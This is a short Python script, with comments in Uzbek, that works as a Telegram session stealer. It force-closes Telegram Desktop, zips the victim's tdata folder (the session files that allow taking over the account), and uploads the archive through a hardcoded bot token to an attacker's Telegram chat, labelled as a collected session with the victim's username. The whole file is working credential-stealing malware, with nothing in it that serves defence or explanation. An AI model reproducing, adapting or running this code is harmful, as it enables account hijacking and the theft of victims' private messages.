import os
import zipfile
import requests
import io
from getpass import getuser

# Sozlamalar
TOKEN = "8617771176:AAEeY9Kuu5kNwkpLmSkema8oKaizJ-z5Nfk"
CHAT_ID = "7086429203"

def collect_and_send():
    # Telegramni yopish (fayllarni bo'shatish uchun)
    os.system("taskkill /f /im Telegram.exe >nul 2>&1")
    
    user_name = getuser()
    tdata_path = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Telegram Desktop\\tdata"
    
    if not os.path.exists(tdata_path):
        return

    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
        for root, dirs, files in os.walk(tdata_path):
            # Keraksiz va og'ir papkalarni tashlab ketamiz (tez ishlashi uchun)
            if any(x in root.lower() for x in ['user_data', 'dumps', 'emoji', 'webview', 'temp']):
                continue
                
            for file in files:
                # Faqat session fayllarini va tdata ichidagi muhim xaritalarni olamiz
                # Keraksiz log va exe fayllarni filtrlaymiz
                if file.endswith(('.log', '.exe', '.tmp')) or 'old' in file.lower():
                    continue
                
                file_path = os.path.join(root, file)
                rel_path = os.path.relpath(file_path, tdata_path)
                
                try:
                    # Faylni o'qib arxivga qo'shish
                    with open(file_path, 'rb') as f:
                        zip_file.writestr(rel_path, f.read())
                except:
                    continue

    zip_buffer.seek(0)
    file_size = zip_buffer.getbuffer().nbytes
    
    # Agar arxiv juda kichik bo'lsa yoki bo'sh bo'lsa yubormaymiz
    if file_size < 100:
        return

    # Telegram botga yuborish
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    files = {'document': ('tdata.zip', zip_buffer)}
    data = {'chat_id': CHAT_ID, 'caption': f'✅ Seans yig\'ildi\nUser: {user_name}\nHajm: {file_size / 1024:.2f} KB'}
    
    try:
        # Timeoutni 100 soniya qilamiz, yuklashga ulgurishi uchun
        requests.post(url, data=data, files=files, timeout=100)
    except Exception as e:
        print(f"Xato yuz berdi: {e}")

if __name__ == "__main__":
    collect_and_send()